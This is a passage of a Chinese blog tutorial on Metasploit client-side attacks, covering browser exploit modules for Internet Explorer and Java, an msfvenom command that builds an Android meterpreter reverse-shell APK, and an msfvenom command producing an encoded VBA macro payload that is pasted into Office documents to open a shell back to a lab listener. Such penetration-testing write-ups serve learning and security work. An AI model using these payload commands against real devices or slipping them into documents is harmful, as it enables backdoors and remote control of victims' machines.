<h2 id="利用-IE-浏览器漏洞执行payload"><a href="#利用-IE-浏览器漏洞执行payload" class="headerlink" title="利用 IE 浏览器漏洞执行payload"></a>利用 IE 浏览器漏洞执行payload</h2><h3 id="服务端配置-2"><a href="#服务端配置-2" class="headerlink" title="服务端配置"></a>服务端配置</h3><pre class="line-numbers language-none"><code class="language-none">exploit&#x2F;windows&#x2F;browser&#x2F;ms14_064_ole_code_execution<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221210011291.png" alt="image-20230221210011291"></p>
<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221210114438.png" alt="image-20230221210114438"></p>
<h3 id="客户端访问-2"><a href="#客户端访问-2" class="headerlink" title="客户端访问"></a>客户端访问</h3><p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221210522032.png" alt="image-20230221210522032"></p>
<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221210538153.png" alt="image-20230221210538153"></p>
<h2 id="利用-JRE-漏洞执行payload"><a href="#利用-JRE-漏洞执行payload" class="headerlink" title="利用 JRE 漏洞执行payload"></a>利用 JRE 漏洞执行payload</h2><blockquote>
<p>此模块必须是客户端拥有java运行环境，之后利用msf伪造网站进行侦听即可</p>
<p>流程与前面一样</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;browser&#x2F;java_jre17_driver_manager
use exploit&#x2F;multi&#x2F;browser&#x2F;java_jre17_jmxbean
use exploit&#x2F;multi&#x2F;browser&#x2F;java_jre17_reflection_types<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h2 id="生成-Andriod-后门程序"><a href="#生成-Andriod-后门程序" class="headerlink" title="生成 Andriod 后门程序"></a>生成 Andriod 后门程序</h2><h3 id="服务端配置-3"><a href="#服务端配置-3" class="headerlink" title="服务端配置"></a>服务端配置</h3><p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221212111882.png" alt="image-20230221212111882"></p>
<h3 id="生成payload-1"><a href="#生成payload-1" class="headerlink" title="生成payload"></a>生成payload</h3><pre class="line-numbers language-none"><code class="language-none">msfvenom -p android&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.216.171 LPORT&#x3D;5555 R &gt; &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;a.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221211737686.png" alt="image-20230221211737686"></p>
<blockquote>
<p>之后在Android客户端安装即可，利用成功就会返回meterpreter shell</p>
<p>参考文章：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hkleak/p/4852057.html">https://www.cnblogs.com/hkleak/p/4852057.html</a></p>
</blockquote>
<h2 id="VBScript-感染方式"><a href="#VBScript-感染方式" class="headerlink" title="VBScript 感染方式"></a>VBScript 感染方式</h2><blockquote>
<p>利用宏感染word，excel文档</p>
<p>绕过某些基于文件类型检查的安全机制</p>
</blockquote>
<h3 id="生成-vbscript-脚本"><a href="#生成-vbscript-脚本" class="headerlink" title="生成 vbscript 脚本"></a>生成 vbscript 脚本</h3><pre class="line-numbers language-none"><code class="language-none">msfvenom -a x86 --platform windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.216.171 LPORT&#x3D;4444 -e x86&#x2F;shikata_ga_nai -f vba-exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>生成两部分：第一部分是vbs代码，第二部分是16进制格式的payload</p>
</blockquote>
<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221213236277.png" alt="image-20230221213236277"></p>
<h4 id="复制vba代码到宏"><a href="#复制vba代码到宏" class="headerlink" title="复制vba代码到宏"></a>复制vba代码到宏</h4><p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221213556503.png" alt="image-20230221213556503"></p>
<blockquote>
<p>将msf生成的vbs代码粘贴进来保存</p>
</blockquote>
<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221213749567.png" alt="image-20230221213749567"></p>
<h4 id="复制payload部分到正文"><a href="#复制payload部分到正文" class="headerlink" title="复制payload部分到正文"></a>复制payload部分到正文</h4><p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221214439222.png" alt="image-20230221214439222"></p>
<h3 id="msf启动侦听"><a href="#msf启动侦听" class="headerlink" title="msf启动侦听"></a>msf启动侦听</h3><p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221214628709.png" alt="image-20230221214628709"></p>
<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221214651130.png" alt="image-20230221214651130"></p>
<h3 id="客户端执行宏文件"><a href="#客户端执行宏文件" class="headerlink" title="客户端执行宏文件"></a>客户端执行宏文件</h3><p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221220929720.png" alt="image-20230221220929720"></p>
<blockquote>
<p>由于是生成的是vbs文件，客户端要使用vbs宏才可以执行payload；而客户端使用的是js宏，导致payload无法执行，msf无法获取shell，不过原理相同。</p>
</blockquote>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">无心</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://NoobXW.github.io/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/">http://NoobXW.github.io/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">无心</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/Kali/">
                                    <span class="chip bg-color">Kali</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="Kali渗透测试-MSF【后渗透】">
                        
                        <span class="card-title">Kali渗透测试-MSF【后渗透】</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>23-02-22
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/Kali/" class="post-category">
                                    Kali
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/Kali/">
                        <span class="chip bg-color">Kali</span>
                    </a>
                    
                    <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
                        <span class="chip bg-color">内网渗透</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E3%80%91/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="Kali渗透测试-MSF【漏洞扫描】">
                        
                        <span class="card-title">Kali渗透测试-MSF【漏洞扫描】</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>23-02-21
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/" class="post-category">
                                    漏洞扫描
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/Kali/">
                        <span class="chip bg-color">Kali</span>
                    </a>
                    
                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/">
                        <span class="chip bg-color">漏洞扫描</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('120')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: 无心<br />'
            + '文章作者: 无心<br />'
            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="7286865560"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="/libs/aplayer/Meting.min.js"></script>

    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2023</span>
            
            <a href="/about" target="_blank">无心</a>
            |&nbsp;Powered by&nbsp;梦想
            |&nbsp;About&nbsp;我的博客
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                        class="white-color">225.3k</span>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="http://NoobXW.github.io" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:wangwei89677@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=3012254368" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 3012254368" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    

    <!-- 雪花特效 -->
     
        <script type="text/javascript">
            // 只在桌面版网页启用特效
            var windowWidth = $(window).width();
            if (windowWidth > 768) {
                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
            }
        </script>
    

    <!-- 鼠标星星特效 -->
     
        <script type="text/javascript">
            // 只在桌面版网页启用特效
            var windowWidth = $(window).width();
            if (windowWidth > 768) {
                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
            }
        </script>
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>
